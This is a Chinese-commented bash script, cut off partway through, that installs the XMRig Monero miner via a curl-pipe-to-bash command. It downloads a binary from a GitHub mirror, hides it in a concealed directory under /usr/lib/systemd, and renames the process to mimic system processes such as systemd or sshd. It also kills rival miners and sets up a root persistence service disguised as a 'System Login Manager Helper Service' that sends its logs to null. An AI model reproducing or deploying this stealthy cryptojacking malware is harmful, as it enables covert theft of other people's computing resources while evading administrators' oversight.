#!/bin/bash

# XMR Mining Script
# Usage: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [--auto-compile]

set -e

# 设置环境变量
export HOME=/root
export LC_ALL=en_US.UTF-8

# 初始化全局变量
AUTO_COMPILE=false
IS_CONTAINER=false
DISGUISE_NAME=""
SERVICE_NAME=""
COMPILE_FROM_SOURCE=false

# 解析命令行参数
for arg in "$@"; do
    case $arg in
        --auto-compile)
            AUTO_COMPILE=true
            shift
            ;;
        *)
            # 其他参数保持原样
            ;;
    esac
done

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 日志函数
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_debug() {
    echo -e "${BLUE}[DEBUG]${NC} $1"
}

# 获取伪装进程名
get_disguise_name() {
    # 获取CPU占用最高的进程名，排除xmrig相关进程
    local top_process=$(ps aux --no-headers | grep -v -i xmrig | sort -rn -k3 | head -1 | awk '{print $11}' | sed 's/.*\///')
    
    # 如果获取失败或为空，或者是系统命令，使用备选系统进程名
    if [ -z "$top_process" ] || [ "$top_process" = "ps" ] || [ "$top_process" = "sort" ] || [ "$top_process" = "grep" ] || [ "$top_process" = "awk" ]; then
        local system_processes=("systemd" "kthreadd" "ksoftirqd/0" "migration/0" "rcu_gp" "rcu_par_gp" "kworker/0:0H" "mm_percpu_wq" "ksoftirqd/1" "migration/1" "rcu_sched" "watchdog/0" "sshd" "NetworkManager" "systemd-logind")
        top_process=${system_processes[$RANDOM % ${#system_processes[@]}]}
    fi
    
    echo "$top_process"
}

# 创建隐藏目录
create_hidden_dirs() {
    log_info "创建隐藏安装目录..."
    
    # 使用深层系统目录
    WORK_DIR="/usr/lib/systemd/system-generators/.cache/systemd-update-utmp"
    
    # 创建目录结构
    mkdir -p "$WORK_DIR"
    
    # 设置目录权限
    chmod 755 "$WORK_DIR"
    chmod 755 "/usr/lib/systemd/system-generators/.cache"
    
    log_info "工作目录: $WORK_DIR"
}

# 检查参数
if [ $# -lt 2 ]; then
    log_error "参数不足！"
    echo "使用方法: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [CPU利用率%]"
    echo "示例: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443 50"
    echo "CPU利用率参数可选，默认使用所有CPU核心，设置50表示使用50%的CPU核心"
    exit 1
fi

# 参数解析
WALLET_ADDRESS="$1"
POOL_ADDRESS="$2"
CPU_USAGE="${3:-100}"  # 默认100%使用所有核心

# 验证CPU利用率参数
if ! [[ "$CPU_USAGE" =~ ^[0-9]+$ ]] || [ "$CPU_USAGE" -lt 1 ] || [ "$CPU_USAGE" -gt 100 ]; then
    log_error "CPU利用率参数无效！请输入1-100之间的数字"
    exit 1
fi

log_info "开始XMR挖矿脚本安装..."
log_info "钱包地址: $WALLET_ADDRESS"
log_info "矿池地址: $POOL_ADDRESS"
log_info "CPU利用率: ${CPU_USAGE}%"

# 检测CPU核心数和计算绑定
detect_cpu_info() {
    log_info "检测CPU信息..."
    
    # 获取CPU核心数
    if command -v lscpu >/dev/null 2>&1; then
        TOTAL_CORES=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
    elif [ -f /proc/cpuinfo ]; then
        TOTAL_CORES=$(grep -c "^processor" /proc/cpuinfo)
    else
        log_warn "无法检测CPU核心数，使用默认值4"
        TOTAL_CORES=4
    fi
    
    # 验证核心数
    if ! [[ "$TOTAL_CORES" =~ ^[0-9]+$ ]] || [ "$TOTAL_CORES" -lt 1 ]; then
        log_warn "CPU核心数检测异常，使用默认值4"
        TOTAL_CORES=4
    fi
    
    # 计算需要使用的核心数
    USED_CORES=$(( (TOTAL_CORES * CPU_USAGE + 99) / 100 ))  # 向上取整
    
    # 确保至少使用1个核心
    if [ "$USED_CORES" -lt 1 ]; then
        USED_CORES=1
    fi
    
    # 确保不超过总核心数
    if [ "$USED_CORES" -gt "$TOTAL_CORES" ]; then
        USED_CORES=$TOTAL_CORES
    fi
    
    log_info "CPU总核心数: $TOTAL_CORES"
    log_info "设置使用核心数: $USED_CORES (${CPU_USAGE}%)"
    
    # 生成CPU绑定列表 (0到USED_CORES-1)
    CPU_AFFINITY=""
    for ((i=0; i<USED_CORES; i++)); do
        if [ -z "$CPU_AFFINITY" ]; then
            CPU_AFFINITY="$i"
        else
            CPU_AFFINITY="$CPU_AFFINITY,$i"
        fi
    done
    
    log_info "CPU绑定列表: $CPU_AFFINITY"
}

# 检测系统架构和操作系统
detect_system() {
    log_info "检测系统信息..."
    
    # 检测容器环境
    IS_CONTAINER=false
    CONTAINER_TYPE=""
    
    # 多种方法检测容器环境
    if [ -f /.dockerenv ]; then
        IS_CONTAINER=true
        CONTAINER_TYPE="Docker"
    elif [ -n "${container:-}" ]; then
        IS_CONTAINER=true
        CONTAINER_TYPE="systemd-nspawn"
    elif grep -q 'docker' /proc/1/cgroup 2>/dev/null; then
        IS_CONTAINER=true
        CONTAINER_TYPE="Docker"
    elif grep -q 'lxc' /proc/1/cgroup 2>/dev/null; then
        IS_CONTAINER=true
        CONTAINER_TYPE="LXC"
    elif grep -q 'kubepods' /proc/1/cgroup 2>/dev/null; then
        IS_CONTAINER=true
        CONTAINER_TYPE="Kubernetes"
    elif [ -f /proc/vz/veinfo ] 2>/dev/null; then
        IS_CONTAINER=true
        CONTAINER_TYPE="OpenVZ"
    elif [ "$(stat -c %d:%i / 2>/dev/null)" != "$(stat -c %d:%i /proc/1/root/. 2>/dev/null)" ]; then
        IS_CONTAINER=true
        CONTAINER_TYPE="chroot/container"
    fi
    
    if [[ "$IS_CONTAINER" == "true" ]]; then
        log_info "检测到容器环境: $CONTAINER_TYPE"
    fi
    
    # 检测操作系统
    if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ "$OSTYPE" == "linux-musl"* ]] || [[ "$OSTYPE" == "linux"* ]]; then
        OS="linux"
        # 获取发行版信息
        if [ -f /etc/os-release ]; then
            . /etc/os-release
            OS_ID=${ID:-"linux"}
            OS_VERSION=${VERSION_ID:-"unknown"}
            OS_NAME=${NAME:-"Linux"}
            
            # 特殊处理Alpine Linux (musl libc)
            if [[ "$OSTYPE" == "linux-musl"* ]] || [[ "$ID" == "alpine" ]]; then
                OS_ID="alpine"
                log_info "检测到Alpine Linux (musl libc)"
            fi
        else
            # 如果没有/etc/os-release，尝试其他方法检测
            if [[ "$OSTYPE" == "linux-musl"* ]] || command -v apk >/dev/null 2>&1; then
                OS_ID="alpine"
                OS_VERSION="unknown"
                OS_NAME="Alpine Linux"
                log_info "检测到Alpine Linux环境"
            else
                OS_ID="linux"
                OS_VERSION="unknown"
                OS_NAME="Linux"
            fi
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        OS_ID="macos"
        OS_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "unknown")
        OS_NAME="macOS"
    elif [[ "$OSTYPE" == "freebsd"* ]]; then
        OS="freebsd"
        OS_ID="freebsd"
        OS_VERSION=$(uname -r 2>/dev/null || echo "unknown")
        OS_NAME="FreeBSD"
    else
        log_error "不支持的操作系统: $OSTYPE"
        exit 1
    fi
    
    # 检测CPU架构
    ARCH=$(uname -m)
    case $ARCH in
        x86_64|amd64)
            ARCH="x64"
            COMPILE_FROM_SOURCE=false
            ;;
        aarch64|arm64)
            ARCH="arm64"
            log_warn "检测到ARM64架构，XMRig官方不提供预编译版本"
            log_warn "需要从源码编译安装"
            
            # 在容器环境或非交互式环境中自动继续
            if [[ "$IS_CONTAINER" == "true" ]] || [[ ! -t 0 ]] || [[ "$AUTO_COMPILE" == "true" ]]; then
                log_info "检测到容器/非交互式环境，自动启用源码编译"
                COMPILE_FROM_SOURCE=true
            else
                echo
                read -p "是否继续编译安装？(y/n): " -n 1 -r
                echo
                if [[ ! $REPLY =~ ^[Yy]$ ]]; then
                    log_info "用户取消安装"
                    exit 0
                fi
                COMPILE_FROM_SOURCE=true
            fi
            ;;
        *)
            log_error "不支持的CPU架构: $ARCH"
            exit 1
            ;;
    esac
    
    # 输出详细的系统信息
    log_info "系统检测完成:"
    log_info "  操作系统: $OS_NAME ($OS_ID)"
    log_info "  系统架构: $ARCH"
    if [[ "$IS_CONTAINER" == "true" ]]; then
        log_info "  容器环境: $CONTAINER_TYPE"
    fi
    if [[ "$COMPILE_FROM_SOURCE" == "true" ]]; then
        log_info "  编译模式: 源码编译"
    else
        log_info "  安装模式: 预编译二进制"
    fi
}

# 设置XMRig版本
set_version() {
    log_info "设置XMRig版本..."
    VERSION="6.24.0"
    log_info "XMRig版本: $VERSION"
}

# 确定下载链接
get_download_url() {
    log_info "确定下载链接..."
    
    # 根据操作系统和架构确定适当的下载URL
    case $OS_ID in
        ubuntu|debian)
            if [ "$OS_VERSION" = "20.04" ] || [ "$OS_VERSION" = "20" ]; then
                DISTRO="focal"
            elif [ "$OS_VERSION" = "22.04" ] || [ "$OS_VERSION" = "22" ]; then
                DISTRO="jammy"
            elif [ "$OS_VERSION" = "24.04" ] || [ "$OS_VERSION" = "24" ]; then
                DISTRO="noble"
            else
                DISTRO="focal"  # 默认回退
            fi
            ;;
        centos|rhel|rocky|almalinux|fedora)
            DISTRO="linux-static"  # RHEL系使用静态构建
            ;;
        freebsd)
            DISTRO="freebsd-static"
            ;;
        alpine)
            DISTRO="linux-static"  # Alpine使用静态构建
            ;;
        *)
            DISTRO="linux-static"  # 默认使用静态构建
            ;;
    esac
    
    # 直接使用可执行文件名，不再需要压缩包
    FILENAME="xmrig"
    
    DOWNLOAD_URL="https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
    
    log_info "下载链接: $DOWNLOAD_URL"
}

# 检测并终止现有的xmrig进程
kill_existing_xmrig() {
    log_info "检测现有的xmrig进程..."
    
    # 使用ps命令查找xmrig进程
    local xmrig_pids=$(ps -ef | grep -i xmrig | grep -v grep | awk '{print $2}')
    
    if [ -n "$xmrig_pids" ]; then
        log_warn "发现现有的xmrig进程，正在终止..."
        
        # 遍历所有找到的PID并终止
        for pid in $xmrig_pids; do
            if [ -n "$pid" ] && [ "$pid" -gt 0 ]; then
                log_info "终止进程 PID: $pid"
                
                # 尝试使用sudo终止进程
                if command -v sudo >/dev/null 2>&1; then
                    sudo kill -9 "$pid" 2>/dev/null || {
                        log_warn "使用sudo终止进程 $pid 失败，尝试直接终止"
                        kill -9 "$pid" 2>/dev/null || log_warn "无法终止进程 $pid"
                    }
                else
                    # 如果没有sudo，直接使用kill
                    kill -9 "$pid" 2>/dev/null || log_warn "无法终止进程 $pid"
                fi
            fi
        done
        
        # 等待进程完全终止
        sleep 2
        
        # 再次检查是否还有残留进程
        local remaining_pids=$(ps -ef | grep -i xmrig | grep -v grep | awk '{print $2}')
        if [ -n "$remaining_pids" ]; then
            log_warn "仍有xmrig进程运行，但将继续安装"
        else
            log_info "所有xmrig进程已成功终止"
        fi
    else
        log_info "未发现现有的xmrig进程"
    fi
}

# 检查先决条件
check_prerequisites() {
    log_info "检查先决条件..."
    
    # 检查必需的命令
    local missing_commands=""
    local has_downloader=false
    
    # 检查下载工具
    if command -v wget >/dev/null 2>&1; then
        has_downloader=true
        log_info "检测到wget下载工具"
    fi
    
    if command -v curl >/dev/null 2>&1; then
        has_downloader=true
        log_info "检测到curl下载工具"
    fi
    
    if [ "$has_downloader" = false ]; then
        missing_commands="$missing_commands wget或curl"
    fi
    
    if ! command -v tar >/dev/null 2>&1; then
        missing_commands="$missing_commands tar"
    fi
    
    # 如果需要编译，检查编译工具
    if [ "$COMPILE_FROM_SOURCE" = true ]; then
        log_info "检查编译工具..."
        
        if ! command -v gcc >/dev/null 2>&1 && ! command -v clang >/dev/null 2>&1; then
            missing_commands="$missing_commands gcc或clang"
        fi
        
        if ! command -v g++ >/dev/null 2>&1 && ! command -v clang++ >/dev/null 2>&1; then
            missing_commands="$missing_commands g++或clang++"
        fi
        
        if ! command -v make >/dev/null 2>&1; then
            missing_commands="$missing_commands make"
        fi
        
        if ! command -v cmake >/dev/null 2>&1; then
            missing_commands="$missing_commands cmake"
        fi
        
        if ! command -v git >/dev/null 2>&1; then
            missing_commands="$missing_commands git"
        fi
    fi
    
    if [ -n "$missing_commands" ]; then
        log_warn "缺少必需的命令:$missing_commands"
        log_info "尝试安装缺少的依赖..."
        install_missing_dependencies
        
        # 安装后重新检查关键工具
        if ! command -v tar >/dev/null 2>&1; then
            log_error "安装tar失败。请手动安装后重新运行脚本。"
            exit 1
        fi
        
        # 重新检查下载工具
        has_downloader=false
        if command -v wget >/dev/null 2>&1; then
            has_downloader=true
        fi
        if command -v curl >/dev/null 2>&1; then
            has_downloader=true
        fi
        
        if [ "$has_downloader" = false ]; then
            log_error "安装下载工具失败。请手动安装wget或curl后重新运行脚本。"
            exit 1
        fi
        
        # 如果需要编译，重新检查编译工具
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            if ! command -v gcc >/dev/null 2>&1 && ! command -v clang >/dev/null 2>&1; then
                log_error "安装C编译器失败。请手动安装gcc或clang后重新运行脚本。"
                exit 1
            fi
            
            if ! command -v g++ >/dev/null 2>&1 && ! command -v clang++ >/dev/null 2>&1; then
                log_error "安装C++编译器失败。请手动安装g++或clang++后重新运行脚本。"
                exit 1
            fi
            
            if ! command -v make >/dev/null 2>&1; then
                log_error "安装make失败。请手动安装make后重新运行脚本。"
                exit 1
            fi
            
            if ! command -v cmake >/dev/null 2>&1; then
                log_error "安装cmake失败。请手动安装cmake后重新运行脚本。"
                exit 1
            fi
            
            if ! command -v git >/dev/null 2>&1; then
                log_error "安装git失败。请手动安装git后重新运行脚本。"
                exit 1
            fi
        fi
        
        log_info "所有必需的依赖现在都可用了。"
    else
        log_info "所有必需的依赖都可用。"
    fi
}

# 安装缺少的依赖
install_missing_dependencies() {
    # 在容器环境中，优先使用非交互式安装
    local install_flags=""
    if [ "$IS_CONTAINER" = true ]; then
        log_info "容器环境检测到，使用非交互式安装"
        export DEBIAN_FRONTEND=noninteractive
        install_flags="-y -qq"
    else
        install_flags="-y"
    fi
    
    if command -v apt-get >/dev/null 2>&1; then
        # Debian/Ubuntu - 使用类似C3Pool的简单方法
        log_info "更新包列表..."
        if ! apt-get update $install_flags; then
            log_warn "包更新失败，但继续执行..."
        fi
        
        log_info "安装缺少的包..."
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            apt-get install $install_flags wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev || {
                log_error "安装包失败。请运行: sudo apt-get install wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev"
                exit 1
            }
        else
            apt-get install $install_flags wget curl tar || {
                log_error "安装包失败。请运行: sudo apt-get install wget curl tar"
                exit 1
            }
        fi
        
    elif command -v apk >/dev/null 2>&1; then
        # Alpine Linux - 容器环境常用
        log_info "检测到Alpine Linux，安装必要包..."
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            apk add --no-cache wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev || {
                log_error "安装包失败。请运行: apk add wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev"
                exit 1
            }
        else
            apk add --no-cache wget curl tar || {
                log_error "安装包失败。请运行: apk add wget curl tar"
                exit 1
            }
        fi
        
    elif command -v yum >/dev/null 2>&1; then
        # CentOS/RHEL 7
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            yum groupinstall $install_flags "Development Tools" || {
                log_error "安装开发工具失败。请运行: sudo yum groupinstall \"Development Tools\""
                exit 1
            }
            yum install $install_flags wget curl tar cmake git libuv-devel openssl-devel hwloc-devel || {
                log_error "安装包失败。请运行: sudo yum install wget curl tar cmake git libuv-devel openssl-devel hwloc-devel"
                exit 1
            }
        else
            yum install -y wget curl tar || {
                log_error "安装包失败。请运行: sudo yum install wget curl tar"
                exit 1
            }
        fi
    elif command -v dnf >/dev/null 2>&1; then
        # CentOS/RHEL 8+/Fedora
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            dnf groupinstall -y "Development Tools" || {
                log_error "安装开发工具失败。请运行: sudo dnf groupinstall \"Development Tools\""
                exit 1
            }
            dnf install -y wget curl tar cmake git || {
                log_error "安装包失败。请运行: sudo dnf install wget curl tar cmake git"
                exit 1
            }
        else
            dnf install -y wget curl tar || {
                log_error "安装包失败。请运行: sudo dnf install wget curl tar"
                exit 1
            }
        fi
    elif command -v zypper >/dev/null 2>&1; then
        # openSUSE
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            zypper install -y -t pattern devel_basis || {
                log_error "安装开发工具失败。请运行: sudo zypper install -t pattern devel_basis"
                exit 1
            }
            zypper install -y wget curl tar cmake git || {
                log_error "安装包失败。请运行: sudo zypper install wget curl tar cmake git"
                exit 1
            }
        else
            zypper install -y wget curl tar || {
                log_error "安装包失败。请运行: sudo zypper install wget curl tar"
                exit 1
            }
        fi
    elif command -v pacman >/dev/null 2>&1; then
        # Arch Linux
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            pacman -Sy --noconfirm base-devel wget curl tar cmake git || {
                log_error "安装包失败。请运行: sudo pacman -S base-devel wget curl tar cmake git"
                exit 1
            }
        else
            pacman -Sy --noconfirm wget curl tar || {
                log_error "安装包失败。请运行: sudo pacman -S wget curl tar"
                exit 1
            }
        fi
    elif command -v apk >/dev/null 2>&1; then
        # Alpine Linux
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            apk add --no-cache wget curl tar build-base cmake git || {
                log_error "安装包失败。请运行: sudo apk add wget curl tar build-base cmake git"
                exit 1
            }
        else
            apk add --no-cache wget curl tar || {
                log_error "安装包失败。请运行: sudo apk add wget curl tar"
                exit 1
            }
        fi
    else
        if [ "$COMPILE_FROM_SOURCE" = true ]; then
            log_error "无法识别包管理器。请手动安装 wget、curl、tar、gcc、g++、make、cmake、git 后重新运行脚本。"
        else
            log_error "无法识别包管理器。请手动安装 wget、curl、tar 后重新运行脚本。"
        fi
        exit 1
    fi
}

# 下载和安装XMRig
download_and_install() {
    log_info "下载和安装XMRig..."
    
    # 创建隐藏目录
    create_hidden_dirs
    cd "$WORK_DIR"
    
    if [ "$COMPILE_FROM_SOURCE" = true ]; then
        # ARM架构：下载源码并编译
        compile_from_source
    else
        # x64架构：下载预编译版本
        download_precompiled_binary
    fi
}

# 下载预编译二进制文件
download_precompiled_binary() {
    # 下载文件 - 优先使用wget，备用curl
    log_info "下载 $FILENAME ..."
    
    # 尝试使用wget下载
    if command -v wget >/dev/null 2>&1; then
        log_info "使用wget下载..."
        if wget -q --show-progress "$DOWNLOAD_URL" -O "$FILENAME" 2>/dev/null; then
            log_info "wget下载成功"
        else
            log_warn "wget下载失败，尝试使用curl..."
            rm -f "$FILENAME"  # 清理可能的部分下载文件
            
            if command -v curl >/dev/null 2>&1; then
                if curl -L -o "$FILENAME" "$DOWNLOAD_URL" --progress-bar; then
                    log_info "curl下载成功"
                else
                    log_error "curl下载也失败"
                    exit 1
                fi
            else
                log_error "wget和curl都不可用，无法下载文件"
                exit 1
            fi
        fi
    elif command -v curl >/dev/null 2>&1; then
        log_info "使用curl下载..."
        if curl -L -o "$FILENAME" "$DOWNLOAD_URL" --progress-bar; then
            log_info "curl下载成功"
        else
            log_error "curl下载失败"
            exit 1
        fi
    else
        log_error "wget和curl都不可用，无法下载文件"
        log_error "请安装wget或curl后重新运行脚本"
        exit 1
    fi
    
    # 验证下载的文件
    if [ ! -f "$FILENAME" ] || [ ! -s "$FILENAME" ]; then
        log_error "下载的文件不存在或为空"
        exit 1
    fi
    
    log_info "文件下载完成，大小: $(du -h "$FILENAME" | cut -f1)"
    
    # 设置可执行权限
    log_info "设置可执行权限..."
    chmod +x "$FILENAME" || {
        log_error "设置可执行权限失败"
        exit 1
    }
    
    # 删除官方配置文件（如果存在）
    if [ -f "$WORK_DIR/config.json" ]; then
        log_info "删除官方默认配置文件..."
        rm -f "$WORK_DIR/config.json"
    fi
    
    # 删除不必要的文件
    log_info "清理不必要的文件..."
    rm -f SHA256SUMS 2>/dev/null || true
    rm -f *.txt 2>/dev/null || true
    rm -f README* 2>/dev/null || true
    rm -f LICENSE* 2>/dev/null || true
    
    # 获取伪装名称（在重命名前重新获取）
    local disguise_name=$(get_disguise_name)
    
    # 进程名称伪装
    log_info "设置进程伪装..."
    log_info "将xmrig重命名为: $disguise_name"
    
    # 重命名xmrig为伪装名称
    mv "$FILENAME" "$disguise_name" || {
        log_error "重命名xmrig失败"
        exit 1
    }
    
    # 设置伪装文件的执行权限
    chmod +x "$disguise_name"
    
    # 创建软链接保持兼容性
    ln -sf "$disguise_name" xmrig
}

# 从源码编译XMRig
compile_from_source() {
    log_info "开始从源码编译XMRig..."
    
    # 设置源码下载URL和文件名
    local SOURCE_URL="https://gh.llkk.cc/https://github.com/xmrig/xmrig/archive/v${VERSION}.tar.gz"
    local SOURCE_FILENAME="xmrig-${VERSION}.tar.gz"
    
    log_info "下载源码: $SOURCE_FILENAME"
    
    # 下载源码
    if command -v wget >/dev/null 2>&1; then
        log_info "使用wget下载源码..."
        if wget -q --show-progress "$SOURCE_URL" -O "$SOURCE_FILENAME" 2>/dev/null; then
            log_info "wget下载成功"
        else
            log_warn "wget下载失败，尝试使用curl..."
            rm -f "$SOURCE_FILENAME"
            
            if command -v curl >/dev/null 2>&1; then
                if curl -L -o "$SOURCE_FILENAME" "$SOURCE_URL" --progress-bar; then
                    log_info "curl下载成功"
                else
                    log_error "curl下载也失败"
                    exit 1
                fi
            else
                log_error "wget和curl都不可用，无法下载源码"
                exit 1
            fi
        fi
    elif command -v curl >/dev/null 2>&1; then
        log_info "使用curl下载源码..."
        if curl -L -o "$SOURCE_FILENAME" "$SOURCE_URL" --progress-bar; then
            log_info "curl下载成功"
        else
            log_error "curl下载失败"
            exit 1
        fi
    else
        log_error "wget和curl都不可用，无法下载源码"
        exit 1
    fi
    
    # 验证下载的源码文件
    if [ ! -f "$SOURCE_FILENAME" ] || [ ! -s "$SOURCE_FILENAME" ]; then
        log_error "下载的源码文件不存在或为空"
        exit 1
    fi
    
    log_info "源码下载完成，大小: $(du -h "$SOURCE_FILENAME" | cut -f1)"
    
    # 解压源码到当前目录
    log_info "解压源码..."
    tar -xzf "$SOURCE_FILENAME" || {
        log_error "解压源码失败"
        exit 1
    }
    
    # 清理源码压缩包
    rm -f "$SOURCE_FILENAME"
    
    # 进入源码目录
    local SOURCE_DIR="xmrig-${VERSION}"
    if [ ! -d "$SOURCE_DIR" ]; then
        log_error "源码目录 $SOURCE_DIR 不存在"
        exit 1
    fi
    
    cd "$SOURCE_DIR" || {
        log_error "无法进入源码目录 $SOURCE_DIR"
        exit 1
    }
    
    log_info "进入源码目录: $(pwd)"
    
    # 开始编译
    log_info "开始编译XMRig..."
    
    # 创建构建目录
    mkdir -p build
    cd build
    
    # 运行cmake配置
    log_info "运行cmake配置..."
    local cmake_flags="-DCMAKE_BUILD_TYPE=Release"
    
    # 在容器环境中添加额外的编译优化
    if [[ "$IS_CONTAINER" == "true" ]]; then
        log_info "检测到容器环境，应用容器优化编译选项"
        cmake_flags="$cmake_flags -DWITH_HWLOC=OFF -DWITH_TLS=OFF"
        # 在资源受限的容器中禁用一些可选功能
        cmake_flags="$cmake_flags -DWITH_OPENCL=OFF -DWITH_CUDA=OFF"
    fi
    
    if ! cmake .. $cmake_flags; then
        log_error "cmake配置失败"
        exit 1
    fi
    
    # 编译
    log_info "开始编译（这可能需要几分钟）..."
    local cpu_cores=$(nproc 2>/dev/null || echo "1")
    
    # 在容器环境中限制并行编译数量以避免内存不足
    if [[ "$IS_CONTAINER" == "true" ]] && [[ $cpu_cores -gt 2 ]]; then
        cpu_cores=2
        log_info "容器环境限制编译并行数为: $cpu_cores"
    fi
    
    if ! make -j"$cpu_cores"; then
        log_error "编译失败"
        # 在容器环境中尝试单线程编译
        if [[ "$IS_CONTAINER" == "true" ]] && [[ $cpu_cores -gt 1 ]]; then
            log_warn "多线程编译失败，尝试单线程编译..."
            if ! make -j1; then
                log_error "单线程编译也失败"
                exit 1
            fi
        else
            exit 1
        fi
    fi
    
    # 检查编译结果
    if [ ! -f "xmrig" ]; then
        log_error "编译完成但未找到xmrig可执行文件"
        exit 1
    fi
    
    log_info "编译成功！"
    
    # 复制编译好的文件到工作目录
    cp xmrig "$WORK_DIR/"
    cd "$WORK_DIR"
    
    # 清理源码目录
    log_info "清理源码目录..."
    rm -rf "xmrig-${VERSION}"
    
    # 获取伪装名称
    local disguise_name=$(get_disguise_name)
    
    # 设置执行权限
    chmod +x xmrig
    
    # 进程名称伪装
    log_info "设置进程伪装..."
    log_info "将xmrig重命名为: $disguise_name"
    
    # 重命名xmrig为伪装名称
    mv xmrig "$disguise_name" || {
        log_error "重命名xmrig失败"
        exit 1
    }
    
    # 设置伪装文件的执行权限
    chmod +x "$disguise_name"
    
    # 创建软链接保持兼容性
    ln -sf "$disguise_name" xmrig
    
    # 更新全局变量
    DISGUISE_NAME="$disguise_name"
    
    log_info "XMRig编译和安装完成，进程已伪装为: $DISGUISE_NAME"
}

# 创建配置文件
create_config() {
    log_info "创建配置文件..."
    
    # 如果存在官方配置文件，直接覆盖
    if [ -f "$WORK_DIR/config.json" ]; then
        log_info "检测到官方配置文件，将完全覆盖..."
        rm -f "$WORK_DIR/config.json"
    fi
    
    cat > "$WORK_DIR/config.json" << EOF
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": $USED_CORES,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false,
        "affinity": [$CPU_AFFINITY]
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$POOL_ADDRESS",
            "user": "$WALLET_ADDRESS",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ip_version": 0,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
    
    log_info "配置文件创建完成"
}

# 创建systemd服务
create_systemd_service() {
    log_info "创建systemd服务..."
    
    cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=System Login Manager Helper Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$WORK_DIR
ExecStart=$WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
SyslogIdentifier=systemd-logind

[Install]
WantedBy=multi-user.target
EOF
    
    # 重新加载systemd配置
    systemctl daemon-reload
    
    # 启用服务
    systemctl enable ${SERVICE_NAME}.service
    
    log_info "systemd服务创建完成"
}

# 创建SysV init脚本（用于不支持systemd的系统）
create_sysv_service() {
    log_info "创建SysV init脚本..."
    
    cat > /etc/init.d/$SERVICE_NAME << EOF
#!/bin/bash
# $SERVICE_NAME        System Login Manager Helper Service
# chkconfig: 35 99 99
# description: System Login Manager Helper Service
#

. /etc/rc.d/init.d/functions

USER="root"
DAEMON="$DISGUISE_NAME"
ROOT_DIR="$WORK_DIR"

SERVER="\$ROOT_DIR/\$DAEMON"
LOCK_FILE="/var/lock/subsys/$SERVICE_NAME"

do_start() {
    if [ ! -f "\$LOCK_FILE" ] ; then
        echo -n \$"Starting \$DAEMON: "
        runuser -l "\$USER" -c "\$SERVER --config=\$ROOT_DIR/config.json" && echo_success || echo_failure
        RETVAL=\$?
        echo
        [ \$RETVAL -eq 0 ] && touch \$LOCK_FILE
    else
        echo "\$DAEMON is locked."
    fi
}
do_stop() {
    echo -n \$"Shutting down \$DAEMON: "
    pid=\$(ps -aefw | grep "\$DAEMON" | grep -v " grep " | awk '{print \$2}')
    kill -9 \$pid > /dev/null 2>&1
    # Also kill any xmrig processes
    pkill -f "xmrig" > /dev/null 2>&1
    [ \$? -eq 0 ] && echo_success || echo_failure
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && rm -f \$LOCK_FILE
}

case "\$1" in
    start)
        do_start
        ;;
    stop)
